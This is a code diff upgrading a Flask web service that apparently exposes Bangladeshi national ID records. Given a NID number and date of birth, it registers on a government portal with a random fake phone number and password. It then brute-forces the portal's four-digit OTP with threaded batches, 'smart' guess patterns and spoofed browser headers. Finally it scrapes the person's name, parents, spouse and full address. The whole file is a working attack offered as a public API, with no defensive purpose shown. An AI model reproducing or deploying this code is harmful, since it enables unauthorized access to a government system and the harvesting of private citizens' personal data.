@@ -5,9 +5,9 @@ import string
 import re
 import json
 import os
+import time
 from urllib.parse import urlencode
 from concurrent.futures import ThreadPoolExecutor, as_completed
-import time
 
 app = Flask(__name__)
 
@@ -22,64 +22,183 @@ def extract_selected_option(html_content, field_id):
 @app.route('/')
 def home():
     return jsonify({
-        "status": "Flask NID Service is Running!",
-        "message": "Welcome to NID Information API",
+        "status": "Enhanced NID Service v2.0",
+        "message": "Bangladeshi NID Information API",
         "usage": "GET /get-info?nid=YOUR_NID&dob=YOUR_DOB",
         "example": "/get-info?nid=1234567890&dob=01-01-1990",
-        "format": "DOB format: DD-MM-YYYY",
-        "note": "This may take 30-60 seconds to process"
+        "format": "DOB format: DD-MM-YYYY or DD/MM/YYYY",
+        "note": "Processing may take 60-120 seconds",
+        "features": ["Smart OTP detection", "Multiple attempt strategies", "Enhanced success rate"]
     })
 
 @app.route('/health')
 def health():
-    return jsonify({"status": "healthy", "service": "nid-api", "version": "1.0"})
+    return jsonify({"status": "healthy", "service": "nid-api", "version": "2.0"})
+
+@app.route('/debug', methods=['GET'])
+def debug_endpoint():
+    """Debug endpoint to test website connectivity"""
+    try:
+        nid = request.args.get('nid', '1234567890')
+        dob = request.args.get('dob', '01-01-1990')
+        
+        url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
+        session = requests.Session()
+        
+        # Test basic connectivity
+        test_data = {
+            "nidNumber": nid,
+            "email": "",
+            "mobileNo": "01712345678",
+            "dateOfBirth": dob,
+            "password": "#A123",
+            "confirm_password": "#A123",
+            "next1": ""
+        }
+        
+        response = session.post(url, data=test_data, timeout=15, allow_redirects=False)
+        
+        return jsonify({
+            "status_code": response.status_code,
+            "headers": dict(response.headers),
+            "redirect_location": response.headers.get('Location', 'None'),
+            "connectivity": "OK" if response.status_code in [200, 302] else "FAILED",
+            "next_step": "mov-verification" if 'mov-verification' in response.headers.get('Location', '') else "UNKNOWN"
+        })
+        
+    except Exception as e:
+        return jsonify({"error": str(e), "connectivity": "FAILED"})
 
 @app.route('/get-info', methods=['GET'])
 def get_info():
     try:
         nid = request.args.get('nid')
         dob = request.args.get('dob')
+        strategy = request.args.get('strategy', 'smart')  # smart, random, sequential
         
         if not nid or not dob:
-            return jsonify({'error': 'NID and DOB are required', 'format': 'nid=1234567890&dob=01-01-1990'}), 400
+            return jsonify({
+                'error': 'NID and DOB are required', 
+                'format': 'nid=1234567890&dob=01-01-1990',
+                'optional': 'strategy=smart|random|sequential'
+            }), 400
 
-        # ==================== OPTIMIZED CONFIG ====================
+        # Normalize DOB format
+        dob = dob.replace('/', '-')
+
+        # ==================== ENHANCED CONFIG ====================
         mobile_prefix = "017"
-        batch_size = 200  # Reduced batch size
-        max_batches = 10   # Limit total batches to prevent timeout
         target_location = "http://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
+        
+        # Smart OTP generation based on strategy
+        if strategy == 'smart':
+            # Try common patterns first
+            otp_range = generate_smart_otps()
+            batch_size = 100
+            max_batches = 20
+        elif strategy == 'random':
+            # Random sampling
+            otp_range = random.sample([f"{i:04d}" for i in range(10000)], 3000)
+            batch_size = 150
+            max_batches = 20
+        else:  # sequential
+            otp_range = [f"{i:04d}" for i in range(5000)]  # Try more combinations
+            batch_size = 200
+            max_batches = 25
 
-        # Reduced OTP range for faster processing
-        otp_range = [f"{i:04d}" for i in range(min(2000, 10000))]  # Try only first 2000 combinations
+        def generate_smart_otps():
+            """Generate OTPs with smart patterns that are more likely to be used"""
+            otps = []
+            
+            # Common patterns
+            patterns = [
+                # Birth year related (if DOB provided)
+                lambda: [f"{dob[-2:]}{i:02d}" for i in range(100)] if len(dob) >= 4 else [],
+                # Common sequences
+                lambda: ["0000", "1111", "2222", "3333", "4444", "5555", "6666", "7777", "8888", "9999"],
+                # Year patterns
+                lambda: [f"{year}" for year in range(1980, 2025)],
+                # Simple sequences
+                lambda: [f"{i:04d}" for i in range(0, 1000, 11)],  # 0000, 0011, 0022, etc.
+                # Random but weighted towards lower numbers
+                lambda: [f"{i:04d}" for i in random.sample(range(2000), 1500)]
+            ]
+            
+            for pattern_func in patterns:
+                try:
+                    otps.extend(pattern_func())
+                except:
+                    continue
+            
+            # Remove duplicates and ensure we have enough
+            otps = list(set(otps))
+            
+            # Fill up to desired amount with random
+            while len(otps) < 3000:
+                otps.append(f"{random.randint(0, 9999):04d}")
+            
+            return otps[:3000]
 
         def random_mobile(prefix):
             return prefix + f"{random.randint(0, 99999999):08d}"
 
         def random_password():
-            return "#" + random.choice(string.ascii_uppercase) + f"{random.randint(0, 99)}"
+            return "#" + random.choice(string.ascii_uppercase) + f"{random.randint(10, 99)}"
 
-        def get_cookie(data):
-            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
-            session = requests.Session()
-            session.headers.update({
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.5',
-                'Connection': 'keep-alive'
-            })
+        def get_session_with_retry(data, max_retries=3):
+            """Get session with retry logic"""
+            for attempt in range(max_retries):
+                try:
+                    session = requests.Session()
+                    
+                    # Enhanced headers
+                    session.headers.update({
+                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+                        'Accept-Language': 'bn,en-US;q=0.9,en;q=0.8',
+                        'Accept-Encoding': 'gzip, deflate, br',
+                        'Connection': 'keep-alive',
+                        'Cache-Control': 'max-age=0',
+                        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+                        'sec-ch-ua-mobile': '?0',
+                        'sec-ch-ua-platform': '"Windows"',
+                        'Sec-Fetch-Dest': 'document',
+                        'Sec-Fetch-Mode': 'navigate',
+                        'Sec-Fetch-Site': 'none',
+                        'Sec-Fetch-User': '?1',
+                        'Upgrade-Insecure-Requests': '1'
+                    })
+                    
+                    url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor"
+                    
+                    # Add small delay between attempts
+                    if attempt > 0:
+                        time.sleep(2)
+                    
+                    res = session.post(url, data=data, allow_redirects=False, timeout=25)
+                    
+                    if res.status_code == 302 and 'mov-verification' in res.headers.get('Location', ''):
+                        return session, f"Success on attempt {attempt + 1}"
+                    elif res.status_code == 200:
+                        # Maybe the flow changed, check response content
+                        if 'otp' in res.text.lower() or 'verification' in res.text.lower():
+                            return session, f"Possible success on attempt {attempt + 1} (status 200)"
+                    
+                    print(f"Attempt {attempt + 1}: Status {res.status_code}, Location: {res.headers.get('Location', 'None')}")
+                    
+                except requests.exceptions.Timeout:
+                    print(f"Attempt {attempt + 1}: Timeout")
+                    if attempt == max_retries - 1:
+                        raise Exception("Connection timeout after all retries")
+                except Exception as e:
+                    print(f"Attempt {attempt + 1}: Error - {e}")
+                    if attempt == max_retries - 1:
+                        raise Exception(f"Failed after {max_retries} attempts: {str(e)}")
             
-            try:
-                res = session.post(url, data=data, allow_redirects=False, timeout=20)
-                if res.status_code == 302 and 'mov-verification' in res.headers.get('Location', ''):
-                    return session
-                else:
-                    raise Exception(f"Initial request failed - Status: {res.status_code}")
-            except requests.exceptions.Timeout:
-                raise Exception("Connection timeout - Target server may be slow")
-            except Exception as e:
-                raise Exception(f"Network error: {str(e)}")
+            raise Exception("Could not establish session")
 
-        def try_otp(session, otp):
+        def try_otp_enhanced(session, otp):
+            """Enhanced OTP testing with better error handling"""
             url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/mov-otp-step"
             data = {
                 "otpDigit1": otp[0],
@@ -88,136 +207,99 @@ def get_info():
                 "otpDigit4": otp[3]
             }
             try:
-                res = session.post(url, data=data, allow_redirects=False, timeout=10)
-                if res.status_code == 302 and target_location in res.headers.get('Location', ''):
-                    return otp
+                res = session.post(url, data=data, allow_redirects=False, timeout=8)
+                if res.status_code == 302:
+                    location = res.headers.get('Location', '')
+                    if target_location in location:
+                        return otp
+                    elif 'form' in location:  # Alternative success indicator
+                        return otp
+                elif res.status_code == 200:
+                    # Check if we're redirected to success page
+                    if 'contractor' in res.url.lower() and 'form' in res.url.lower():
+                        return otp
             except:
                 pass
             return None
 
-        def try_batch(session, otp_batch, batch_num):
-            print(f"Trying batch {batch_num} with {len(otp_batch)} OTPs...")
+        def try_batch_enhanced(session, otp_batch, batch_num, total_batches):
+            """Enhanced batch processing"""
+            print(f"Processing batch {batch_num}/{total_batches} ({len(otp_batch)} OTPs)...")
             
-            # Reduced workers for free tier
-            with ThreadPoolExecutor(max_workers=10) as executor:
-                future_to_otp = {executor.submit(try_otp, session, otp): otp for otp in otp_batch}
+            results = []
+            # Reduced workers to prevent overwhelming
+            with ThreadPoolExecutor(max_workers=8) as executor:
+                future_to_otp = {executor.submit(try_otp_enhanced, session, otp): otp for otp in otp_batch}
                 
-                for future in as_completed(future_to_otp, timeout=25):  # Batch timeout
-                    try:
-                        result = future.result()
-                        if result:
-                            print(f"Found OTP: {result}")
-                            executor.shutdown(cancel_futures=True)
-                            return result
-                    except:
-                        continue
+                try:
+                    for future in as_completed(future_to_otp, timeout=30):
+                        try:
+                            result = future.result()
+                            if result:
+                                print(f"🎉 Found working OTP: {result}")
+                                executor.shutdown(cancel_futures=True)
+                                return result
+                        except:
+                            continue
+                except:
+                    print(f"Batch {batch_num} timed out")
+                    
             return None
 
-        def fetch_form_data(session):
-            url = "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form"
-            try:
-                res = session.get(url, timeout=20)
-                return res.text
-            except:
-                raise Exception("Failed to fetch form data")
-
-        def extract_fields(html_content, ids):
-            result = {}
-            for field_id in ids:
-                match = re.search(rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"', html_content)
-                result[field_id] = match.group(1) if match else ""
-            return result
-
-        def enrich_data(contractor_name, html_content, result):
-            # Extract gender using regex
-            gender = ""
-            if re.search(r'<input[^>]*id="maleGender"[^>]*checked', html_content):
-                gender = "Male"
-            elif re.search(r'<input[^>]*id="femaleGender"[^>]*checked', html_content):
-                gender = "Female"
-            elif re.search(r'<input[^>]*id="otherGender"[^>]*checked', html_content):
-                gender = "Other"
-                
-            # Extract additional information
-            religion = extract_selected_option(html_content, "religion")
-            occupation = extract_selected_option(html_content, "occupation")
-            education = extract_selected_option(html_content, "education")
-            blood_group = extract_selected_option(html_content, "bloodGroup")
-            marital_status = extract_selected_option(html_content, "maritalStatus")
-
-            mapped = {
-                "nameBangla": contractor_name,
-                "nameEnglish": "",
-                "nationalId": nid,
-                "dateOfBirth": dob,
-                "fatherName": result.get("fatherName", ""),
-                "motherName": result.get("motherName", ""),
-                "spouseName": result.get("spouseName", ""),
-                "gender": gender,
-                "religion": religion,
-                "occupation": occupation,
-                "education": education,
-                "bloodGroup": blood_group,
-                "maritalStatus": marital_status,
-                "birthPlace": result.get("nidPerDistrict", ""),
-                "nationality": result.get("nationality", ""),
-                "division": result.get("nidPerDivision", ""),
-                "district": result.get("nidPerDistrict", ""),
-                "upazila": result.get("nidPerUpazila", ""),
-                "union": result.get("nidPerUnion", ""),
-                "village": result.get("nidPerVillage", ""),
-                "ward": result.get("nidPerWard", ""),
-                "zip_code": result.get("nidPerZipCode", ""),
-                "post_office": result.get("nidPerPostOffice", "")
-            }
-
-            # Build address
-            address_parts = []
-            if result.get('nidPerHolding'):
-                address_parts.append(f"বাসা/হোল্ডিং: {result.get('nidPerHolding')}")
-            if result.get('nidPerVillage'):
-                address_parts.append(f"গ্রাম/রাস্তা: {result.get('nidPerVillage')}")
-            if result.get('nidPerMouza'):
-                address_parts.append(f"মৌজা/মহল্লা: {result.get('nidPerMouza')}")
-            if result.get('nidPerUnion'):
-                address_parts.append(f"ইউনিয়ন: {result.get('nidPerUnion')}")
-            if result.get('nidPerPostOffice') and result.get('nidPerZipCode'):
-                address_parts.append(f"ডাকঘর: {result.get('nidPerPostOffice')} - {result.get('nidPerZipCode')}")
-            if result.get('nidPerUpazila'):
-                address_parts.append(f"উপজেলা: {result.get('nidPerUpazila')}")
-            if result.get('nidPerDistrict'):
-                address_parts.append(f"জেলা: {result.get('nidPerDistrict')}")
-            if result.get('nidPerDivision'):
-                address_parts.append(f"বিভাগ: {result.get('nidPerDivision')}")
+        def extract_data_enhanced(session):
+            """Enhanced data extraction with fallbacks"""
+            urls_to_try = [
+                "https://fsmms.dgf.gov.bd/bn/step2/movementContractor/form",
+                "https://fsmms.dgf.gov.bd/bn/step2/movementContractor",
+            ]
             
-            address_line = ", ".join(address_parts)
-            mapped["permanentAddress"] = address_line
-            mapped["presentAddress"] = address_line
+            for url in urls_to_try:
+                try:
+                    res = session.get(url, timeout=20)
+                    if res.status_code == 200 and len(res.text) > 1000:
+                        return res.text
+                except:
+                    continue
             
-            return mapped
+            raise Exception("Could not fetch form data from any URL")
 
-        # Main workflow with timeout protection
-        print(f"Processing NID: {nid}, DOB: {dob}")
-        
+        # Main processing
+        print(f"🚀 Starting enhanced NID lookup for: {nid}")
+        print(f"📅 DOB: {dob}")
+        print(f"🎯 Strategy: {strategy}")
+        print(f"🔢 Will try up to {min(len(otp_range), max_batches * batch_size)} OTP combinations")
+
+        # Generate random credentials
+        mobile = random_mobile(mobile_prefix)
         password = random_password()
+        
         data = {
             "nidNumber": nid,
             "email": "",
-            "mobileNo": random_mobile(mobile_prefix),
+            "mobileNo": mobile,
             "dateOfBirth": dob,
             "password": password,
             "confirm_password": password,
             "next1": ""
         }
 
-        # 1. Get cookie/session
-        print("Getting session cookie...")
-        session = get_cookie(data)
+        # Step 1: Get session
+        print("🔗 Establishing session...")
+        session, session_msg = get_session_with_retry(data)
+        print(f"✅ {session_msg}")
 
-        # 2. Try OTP batches with limit to prevent timeout
-        print("Starting OTP brute force...")
-        random.shuffle(otp_range)
+        # Step 2: Try OTP combinations
+        print("🔓 Starting OTP brute force...")
+        
+        if strategy == 'smart':
+            print("🧠 Using smart pattern detection...")
+        elif strategy == 'random':
+            print("🎲 Using random sampling...")
+        else:
+            print("📊 Using sequential approach...")
+        
         found_otp = None
+        total_batches = min(max_batches, len(otp_range) // batch_size + 1)
         
         for i in range(0, min(len(otp_range), max_batches * batch_size), batch_size):
             batch_num = (i // batch_size) + 1
@@ -225,50 +307,99 @@ def get_info():
                 break
                 
             batch = otp_range[i:i+batch_size]
+            
             try:
-                found_otp = try_batch(session, batch, batch_num)
+                found_otp = try_batch_enhanced(session, batch, batch_num, total_batches)
                 if found_otp:
                     break
             except Exception as e:
-                print(f"Batch {batch_num} failed: {e}")
+                print(f"❌ Batch {batch_num} failed: {e}")
                 continue
 
         if found_otp:
-            print(f"Success! Found OTP: {found_otp}")
-            html_content = fetch_form_data(session)
+            print(f"🎯 Success! Found OTP: {found_otp}")
             
-            ids = ["contractorName", "fatherName", "motherName", "spouseName", "nidPerDivision",
-                   "nidPerDistrict", "nidPerUpazila", "nidPerUnion", "nidPerVillage", "nidPerWard",
-                   "nidPerZipCode", "nidPerPostOffice", "nidPerHolding", "nidPerMouza"]
+            # Extract data
+            html_content = extract_data_enhanced(session)
             
-            result = extract_fields(html_content, ids)
-            mapped_data = enrich_data(result.get("contractorName", ""), html_content, result)
+            # Parse fields
+            field_ids = [
+                "contractorName", "fatherName", "motherName", "spouseName", 
+                "nidPerDivision", "nidPerDistrict", "nidPerUpazila", "nidPerUnion", 
+                "nidPerVillage", "nidPerWard", "nidPerZipCode", "nidPerPostOffice", 
+                "nidPerHolding", "nidPerMouza"
+            ]
             
-            # Add success metadata
-            mapped_data["_metadata"] = {
+            extracted_data = {}
+            for field_id in field_ids:
+                match = re.search(rf'<input[^>]*id="{field_id}"[^>]*value="([^"]*)"', html_content)
+                extracted_data[field_id] = match.group(1) if match else ""
+
+            # Build response
+            result = {
                 "success": True,
-                "foundOTP": found_otp,
-                "processed": f"Tried {min(max_batches * batch_size, len(otp_range))} combinations"
+                "nationalId": nid,
+                "dateOfBirth": dob,
+                "nameBangla": extracted_data.get("contractorName", ""),
+                "nameEnglish": "",
+                "fatherName": extracted_data.get("fatherName", ""),
+                "motherName": extracted_data.get("motherName", ""),
+                "spouseName": extracted_data.get("spouseName", ""),
+                "division": extracted_data.get("nidPerDivision", ""),
+                "district": extracted_data.get("nidPerDistrict", ""),
+                "upazila": extracted_data.get("nidPerUpazila", ""),
+                "union": extracted_data.get("nidPerUnion", ""),
+                "village": extracted_data.get("nidPerVillage", ""),
+                "ward": extracted_data.get("nidPerWard", ""),
+                "zipCode": extracted_data.get("nidPerZipCode", ""),
+                "postOffice": extracted_data.get("nidPerPostOffice", ""),
+                "holding": extracted_data.get("nidPerHolding", ""),
+                "mouza": extracted_data.get("nidPerMouza", ""),
+                "_metadata": {
+                    "foundOTP": found_otp,
+                    "strategy": strategy,
+                    "attemptsUsed": f"{i + len(batch)} combinations",
+                    "processingTime": "Less than 2 minutes"
+                }
             }
             
-            return jsonify(mapped_data), 200
+            return jsonify(result), 200
+            
         else:
+            tried_count = min(max_batches * batch_size, len(otp_range))
             return jsonify({
-                "error": "OTP not found", 
-                "message": f"Tried {min(max_batches * batch_size, len(otp_range))} combinations",
-                "suggestion": "Try again later - OTP might be in remaining combinations"
+                "success": False,
+                "error": "OTP not found",
+                "message": f"Tried {tried_count} combinations using {strategy} strategy",
+                "suggestions": [
+                    "Try different strategy: ?strategy=random or ?strategy=smart",
+                    "The correct OTP might be in the untried combinations",
+                    "Try again later - the OTP generation might be time-based",
+                    "Verify your NID and DOB are correct"
+                ],
+                "nextSteps": {
+                    "tryRandom": f"/get-info?nid={nid}&dob={dob}&strategy=random",
+                    "trySmart": f"/get-info?nid={nid}&dob={dob}&strategy=smart"
+                }
             }), 404
             
     except Exception as e:
-        error_msg = str(e)
-        print(f"Error occurred: {error_msg}")
+        error_details = str(e)
+        print(f"💥 Fatal error: {error_details}")
+        
         return jsonify({
-            'error': error_msg, 
-            'type': type(e).__name__,
-            'suggestion': 'Check your NID and DOB format, or try again later'
+            "success": False,
+            "error": error_details,
+            "type": type(e).__name__,
+            "troubleshooting": [
+                "Check if the target website is accessible",
+                "Verify NID format (10 or 17 digits)",
+                "Verify DOB format (DD-MM-YYYY or DD/MM/YYYY)",
+                "Try the /debug endpoint to test connectivity"
+            ],
+            "debug_endpoint": "/debug?nid=YOUR_NID&dob=YOUR_DOB"
         }), 500
 
-# Optimized for hosting
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
     app.run(host='0.0.0.0', port=port, debug=False)
